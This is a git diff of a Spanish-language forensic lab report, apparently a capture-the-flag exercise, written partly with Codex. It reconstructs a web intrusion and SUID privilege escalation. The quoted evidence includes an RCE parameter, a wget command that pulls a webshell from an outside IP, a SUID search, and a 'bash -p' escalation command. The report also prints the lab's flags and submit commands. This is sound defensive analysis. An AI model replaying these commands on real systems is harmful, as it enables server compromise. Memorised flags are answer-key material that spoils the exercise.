@@ -26,6 +26,12 @@
 - **Partes asistidas:** correlación log–disco de R2, IOC del webshell, eventos de timeline vinculados, respuesta P4, bitácora y salidas de evidencia.
 - **Verificación:** los valores, rutas, horas y líneas incorporados se contrastaron con las salidas crudas guardadas. No se ejecutó, reconstruyó ni modificó el contenido del webshell; el equipo debe revisar este texto y conservar la declaración solo si representa el uso real de IA.
 
+
+**Herramienta:** Codex (OpenAI), aporte de la persona P3.
+
+- **Finalidad y partes asistidas:** análisis de R3, correlación de historial/procesos/archivos abiertos/disco, IOC del binario SUID, eventos de timeline, respuesta P5, revisión del aporte P1 y bitácora.
+- **Verificación:** referencias contrastadas con los artefactos, hashes del checkout y objetos locales de Git; se guardaron salidas y el rechazo del verificador.
+
 ## 1. Resumen del incidente
 
 *Pendiente de completar cuando estén los 5 hallazgos (R1–R5).*
@@ -38,6 +44,8 @@ Antes de analizar `logs/access.log` se corrió `shasum -a 256 -c evidencia.sha25
 
 Como control, se calculó el hash de `logs/access.log` contra el contenido tal como está comiteado en git (`git show HEAD:... | sha256sum`), que no pasa por esa conversión. Ese hash coincide con el registrado en `evidencia.sha256`: el archivo usado para R1 está íntegro. La verificación de los 9 archivos y la identificación del que sí está alterado quedan para la sección de R5.
 
+
+Control complementario de P3: [hashes de los bytes locales](evidencia/salidas/p3-custodia-previa.txt). Todos difieren del manifiesto; no se considera íntegro el checkout byte a byte. Para las cinco fuentes utilizadas por P3, los objetos locales de `HEAD` sí coinciden con el manifiesto y el checkout solo difiere en CRLF/LF ([comparación](evidencia/salidas/p3-custodia-fuentes.txt)). Esa transformación se comparó en memoria, sin escribir en el caso. Esto delimita el efecto de Windows sobre estas fuentes; no autentica el origen del manifiesto ni sustituye el análisis de R5, que queda a su responsable.
 ## 3. Línea de tiempo del ataque
 
 | Hora (UTC) | Evento | Evidencia (archivo:línea) |
@@ -46,9 +54,14 @@ Como control, se calculó el hash de `logs/access.log` contra el contenido tal c
 | 05/Sep/2026 02:18:33 | Misma IP envía `cmd=echo%20FLAG%7Bdfir_vector_sqli%7D%20%3E%20/tmp/.p` (URL-encoded). Decodificado: `echo FLAG{dfir_vector_sqli} > /tmp/.p`. Confirma que el parámetro `cmd` se ejecuta como comando del sistema — este es el vector de entrada/RCE (R1). | `logs/access.log:19` |
 | 05/Sep/2026 02:19:02 | La misma IP usa el canal RCE para ejecutar `wget http://45.13.37.7/s.php -O /var/www/uploads/shell.php`. El listado de disco ubica ese archivo a las 02:19 y la evidencia defanged lo identifica como webshell; la coincidencia de ruta y minuto confirma la correlación log–disco. | `logs/access.log:20`; `disco/listado.txt:4`; `disco/var/www/uploads/shell.php.evidencia.txt:1-9` |
 | 05/Sep/2026 02:19:48 | La misma IP solicita `/uploads/shell.php?c=whoami` y recibe `200`. Esto es consistente con el uso posterior del webshell descargado; el log no muestra el cuerpo de respuesta ni permite atribuir una identidad real al atacante. | `logs/access.log:21`; `disco/var/www/uploads/shell.php.evidencia.txt:5-10` |
-
+| 05/Sep/2026 02:21 (hora del listado; zona no declarada en esa fuente) | El listado registra creación/modificación de `/usr/local/bin/system-check`, descrito como copia de Bash SUID root. El historial muestra búsqueda de SUID y ejecución del mismo binario con `-p -c 'id'`, sin hora propia. Es consistente con la escalada; 02:21 no prueba la hora exacta de ejecución. | `disco/listado.txt:1-5`; `memoria/bash_history.txt:5-7` |
+| 05/Sep/2026 02:30 UTC (captura, no inicio del proceso) | El PID 1477 `system-check`, usuario `root`, `euid=0`, tiene como padre al PID 1240 `bash` de `www-data`. `lsof` vincula el PID 1477 con `/usr/local/bin/system-check`. Las fuentes respaldan un proceso con privilegios elevados en la captura. | `memoria/pslist.txt:1,7-8`; `memoria/lsof.txt:4` |
 **R2 — webshell:** la evidencia de disco contiene `FLAG{dfir_webshell_hallado}`; el extracto completo y la correlación con el log están en [r2-webshell-disco.txt](evidencia/salidas/r2-webshell-disco.txt). La flag fue registrada con el verificador oficial tras normalizar a LF la copia temporal de los scripts y manifiestos utilizados por el verificador ([envío aceptado](evidencia/salidas/r2-submit.txt)).
 
+
+**R3 — escalada SUID:** [fuentes con líneas](evidencia/salidas/r3-escalada-memoria.txt) y [salida directa de `rg`](evidencia/salidas/r3-fuentes-rg.txt). El historial contiene `/usr/local/bin/system-check -p -c 'id'` en la línea 6 y el marcador `FLAG{dfir_privesc_suid}` en la 7. Siendo una copia SUID root de Bash según el listado, `-p` conserva el privilegio efectivo al arrancar y `-c` ejecuta la orden indicada. El historial no incluye la salida de `id`; el respaldo de privilegios procede de `pslist`, que declara `euid=0`. No se ejecutó el binario ni se asumió que la escalada fuera persistencia por sí misma.
+
+El primer [intento de registrar R3](evidencia/salidas/r3-submit.txt) fue rechazado por el verificador local. Posteriormente, se ejecutó desde Git Bash el comando `./ctf submit 11 R3 'FLAG{dfir_privesc_suid}'`, que devolvió `[ OK ] Reto R3 resuelto: Escalada de privilegios (SUID) en memoria`. El [estado actualizado](evidencia/salidas/r3-status-confirmado.txt) conserva la confirmación del progreso. Por lo tanto, **R3 quedó resuelto y validado oficialmente**. Se mantienen los registros del intento fallido anterior como parte del historial de trabajo.
 ## 4. Indicadores de compromiso (IOCs)
 
 | Tipo | Valor | Dónde apareció |
@@ -58,6 +71,8 @@ Como control, se calculó el hash de `logs/access.log` contra el contenido tal c
 | Archivo malicioso | `/var/www/uploads/shell.php` | `disco/listado.txt:4` lo sitúa a las 02:19; `disco/var/www/uploads/shell.php.evidencia.txt:1-9` lo describe como webshell defanged, con parámetro `c` y comentario de descarga desde `45.13.37.7`. La descarga y posterior solicitud figuran en `logs/access.log:20-21`. |
 | Usuario backdoor | | |
 | Persistencia | | |
+| Binario SUID sospechoso | `/usr/local/bin/system-check` (copia de Bash SUID root según el listado) | `disco/listado.txt:5`; `memoria/bash_history.txt:5-6`; `memoria/lsof.txt:4`. Indicador contextual; no se dispone del binario para calcular su hash. |
+| Proceso elevado (contexto de captura) | PID 1477, PPID 1240, `system-check`, `root`, `euid=0`; padre `bash` de `www-data` | `memoria/pslist.txt:7-8`. Los PID son datos de esta captura, no indicadores estables para buscar en otros hosts. |
 
 ## 5. Alcance del daño
 
@@ -80,3 +95,33 @@ En este caso puntual no tengo, desde R1, un ejemplo donde la memoria conservara 
 `history -c` limpia la lista de historial de la shell activa y, en este caso, el artefacto declara que el `.bash_history` de disco fue borrado; no borra retroactivamente una adquisición de memoria ya realizada. El archivo `memoria/bash_history.txt` fue recuperado de memoria y conserva las órdenes previas —incluida la descarga del webshell en la línea 4— y el propio `history -c` en la línea 10 ([evidencia P4](evidencia/salidas/p2-history-memoria.txt)). Por eso la recuperación depende de que la memoria se haya capturado antes de apagar el host o de que el proceso sobrescribiera esas estructuras.
 
 La evidencia permite afirmar que esos comandos estaban presentes en el artefacto de memoria provisto. No permite fijar por sí sola el instante exacto en que se ejecutó cada comando, demostrar que no hubo otras sesiones ni asegurar que toda actividad del atacante quedó recuperada. Para ampliar la atribución o la secuencia temporal harían falta artefactos adicionales, como procesos, sockets, timestamps y logs correlacionados.
+
+**P5 — ¿Por qué un buen forense tiene que entender cómo ataca un pentester?**
+
+Conocer la secuencia ofensiva permite formular hipótesis concretas y buscar huellas verificables. En este caso, `find / -perm -4000 -type f` seguido de `system-check -p -c 'id'` orienta a una búsqueda y uso de un binario SUID, no a una simple consulta de identidad (`memoria/bash_history.txt:5-6`). El listado lo identifica como copia de Bash SUID root (`disco/listado.txt:5`); `pslist` muestra después un proceso con `euid=0` cuyo padre corre como `www-data` (`memoria/pslist.txt:7-8`), y `lsof` conecta su PID con la ruta del binario (`memoria/lsof.txt:4`). Entender privilegios efectivos y opciones de Bash permite explicar esa correlación.
+
+Ese conocimiento no reemplaza la evidencia: el historial no aporta salida de `id` ni timestamps por comando, y la hora de captura no es la de inicio del proceso. Un forense debe separar lo observado de la hipótesis, buscar corroboración independiente y preservar los artefactos. A su vez, conocer qué rastros deja un pentest ayuda a pedir la telemetría adecuada y a recomendar revisar SUID innecesarios, integridad de binarios y procesos privilegiados. No autoriza ejecutar el artefacto sospechoso para comprobarlo sobre el sistema investigado.
+
+## 8. Bitácora
+
+### Persona P3 — R3 y revisión de P1 (2026-10-23)
+
+1. Se verificaron los hashes SHA-256 con `Get-FileHash` contra `evidencia.sha256`, interpretando sus rutas sin el CR final. La salida completa está en [p3-custodia-previa.txt](evidencia/salidas/p3-custodia-previa.txt). No se modificaron los archivos originales.
+2. Desde la raíz del repositorio se ejecutó el análisis reproducible:
+
+   ```powershell
+   python entregas/lab11/grupo06/src/p3_analisis.py
+   rg -n '.' labs/lab11-forensia/caso/memoria/bash_history.txt labs/lab11-forensia/caso/memoria/pslist.txt labs/lab11-forensia/caso/memoria/lsof.txt labs/lab11-forensia/caso/disco/listado.txt > entregas/lab11/grupo06/evidencia/salidas/r3-fuentes-rg.txt
+   ```
+
+   El script calcula hashes, consulta únicamente objetos locales de Git mediante `git show HEAD:<ruta>` y produce un extracto con números de línea. No implementa la ampliación opcional `timeline.py`. El historial se lee como texto, nunca como órdenes a ejecutar.
+3. Se preparó una copia temporal del verificador oficial y sus bibliotecas con finales LF; el manifest se usó como entrada opaca del motor. Desde esa raíz temporal, con Git Bash local, se ejecutó:
+
+   ```bash
+   bash ./ctf submit 11 R3 'FLAG{dfir_privesc_suid}'
+   bash ./ctf status 11
+   ```
+
+   Se conservaron las evidencias del primer intento rechazado y del estado parcial. Posteriormente, se ejecutó desde Git Bash, en la raíz del repositorio, `./ctf submit 11 R3 'FLAG{dfir_privesc_suid}'`. El verificador oficial aceptó la flag y confirmó que R3 estaba resuelto. Se registró el progreso mediante `./ctf status 11`, cuya salida se guardó en `evidencia/salidas/r3-status-confirmado.txt`. No se alteraron los artefactos forenses ni el mecanismo de verificación.
+   
+4. Revisión del aporte de P1: las líneas 18-20 de `access.log` registran solicitudes y HTTP 200; ese código solo no confirma ejecución del parámetro ni el contenido de la respuesta. El marcador decodificado y la coincidencia de `wget` en `memoria/bash_history.txt:4` son corroboración adicional, pero el historial no fija una hora propia. Conviene reemplazar «confirmado por 200» por «solicitud observada, consistente con RCE al correlacionar fuentes». La respuesta P1 menciona procesos y sockets volátiles, pero deja pendiente el ejemplo solicitado de memoria frente a disco; `memoria/bash_history.txt:1,10` ofrece ese ejemplo. Esta revisión deja observaciones para P1 sin reescribir su respuesta ni asumir su tarea.
